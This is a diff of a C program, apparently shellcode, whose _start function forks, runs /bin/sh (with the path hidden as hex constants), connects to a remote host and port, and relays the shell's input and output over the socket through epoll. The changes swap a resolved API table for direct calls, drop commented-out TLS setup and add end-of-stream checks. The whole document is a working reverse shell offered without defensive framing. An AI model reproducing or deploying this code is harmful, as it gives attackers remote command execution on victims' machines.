@@ -48,29 +48,28 @@ void _start(void) {
       struct epoll_event evts;
       char               *args[2];
       pid_t              pid;
-      data_t             ds;
       int                str[8];
 
-      init_api(&ds);
+      // init_api(&ds);
       
       // create pipes for redirection of stdin/stdout/stderr
-      ds.api._pipe(in);
-      ds.api._pipe(out);
+      _pipe(in);
+      _pipe(out);
 
-      pid = ds.api._fork();
+      pid = _fork();
 
       // if child process
       if (pid == 0) {
         // assign read end to stdin
-        ds.api._dup2(in[0],  STDIN_FILENO);
+        _dup2(in[0],  STDIN_FILENO);
         // assign write end to stdout   
-        ds.api._dup2(out[1], STDOUT_FILENO);
+        _dup2(out[1], STDOUT_FILENO);
         // assign write end to stderr  
-        ds.api._dup2(out[1], STDERR_FILENO);  
+        _dup2(out[1], STDERR_FILENO);  
         
         // close pipes
-        ds.api._close(in[0]);  ds.api._close(in[1]);
-        ds.api._close(out[0]); ds.api._close(out[1]);
+        _close(in[0]);  _close(in[1]);
+        _close(out[0]); _close(out[1]);
         
         // execute shell
         // /bin/sh
@@ -78,41 +77,26 @@ void _start(void) {
         str[1] = 0x0068732f;
         args[0] = (char*)str;
         args[1] = NULL;
-        ds.api._execve(args[0], args, NULL);
+        _execve(args[0], args, NULL);
       } else {
         // close read and write ends
-        ds.api._close(in[0]); ds.api._close(out[1]);
+        _close(in[0]); _close(out[1]);
 
-        /*// Initialize TLS session 
-        ds.api._gnutls_init(&session, GNUTLS_CLIENT);
-
-        // X509 stuff
-        ds.api._gnutls_certificate_allocate_credentials(&xcred);
-        ds.api._gnutls_certificate_set_x509_system_trust(xcred);
-        ds.api._gnutls_set_default_priority(session);
-        ds.api._gnutls_credentials_set(session, GNUTLS_CRD_CERTIFICATE, xcred);
-
-        // NORMAL
-        str[0] = 0x4d524f4e;
-        str[1] = 0x00004c41;
-        ds.api._gnutls_priority_init(&priority_cache, (char*)str, NULL);
-        ds.api._gnutls_priority_set(session, priority_cache);*/
-        
         // create a socket
-        ds.s = s = ds.api._socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+        s = _socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
         
         sa.sin_family = AF_INET;
-        sa.sin_port   = ds.api._htons(REMOTE_PORT);
+        sa.sin_port   = _htons(REMOTE_PORT);
         
         // connect to remote host
         sa.sin_addr.s_addr = REMOTE_HOST;
       
-        r = ds.api._connect(s, (struct sockaddr*)&sa, sizeof(sa));
+        r = _connect(s, (struct sockaddr*)&sa, sizeof(sa));
         
 
         if(r >= 0) {
           // open an epoll file descriptor
-          efd = ds.api._epoll_create1(0);
+          efd = _epoll_create1(0);
     
           // add 2 descriptors to monitor stdout and socket
           for (i=0; i<2; i++) {
@@ -120,12 +104,12 @@ void _start(void) {
             evts.data.fd = fd;
             evts.events  = EPOLLIN;
         
-            ds.api._epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
+            _epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
           }
           
           // now loop until user exits or some other error
           for (;;) {
-            r = ds.api._epoll_wait(efd, &evts, 1, -1);
+            r = _epoll_wait(efd, &evts, 1, -1);
           
             // error? bail out           
             if (r < 0) break;
@@ -138,26 +122,30 @@ void _start(void) {
             if(fd == s)
             {
               // read from socket and write to stdin
-              len = ds.api._read(s, buf, BUFSIZ);
-              ds.api._write(in[1], buf, len);
+              len = _read(s, buf, BUFSIZ);
+              if(!len) break;
+
+              _write(in[1], buf, len);
             } else
             {
               // read from stdout and write to socket
-              len = ds.api._read(out[0], buf, BUFSIZ);
+              len = _read(out[0], buf, BUFSIZ);
               if(!len) break;
-              ds.api._write(s, buf, len);
+
+              _write(s, buf, len);
             }      
           }
-        }
         
-        ds.api._epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
-        ds.api._epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
+          _epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
+          _epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
+          _close(efd);
+        }
         // shutdown socket
-        ds.api._shutdown(s, SHUT_RDWR);
-        ds.api._close(s);
+        _shutdown(s, SHUT_RDWR);
+        _close(s);
       }
       // terminate shell      
-      ds.api._kill(pid, SIGCHLD);
-      ds.api._close(in[1]);
-      ds.api._close(out[0]);
+      _kill(pid, SIGCHLD);
+      _close(in[1]);
+      _close(out[0]);
 }
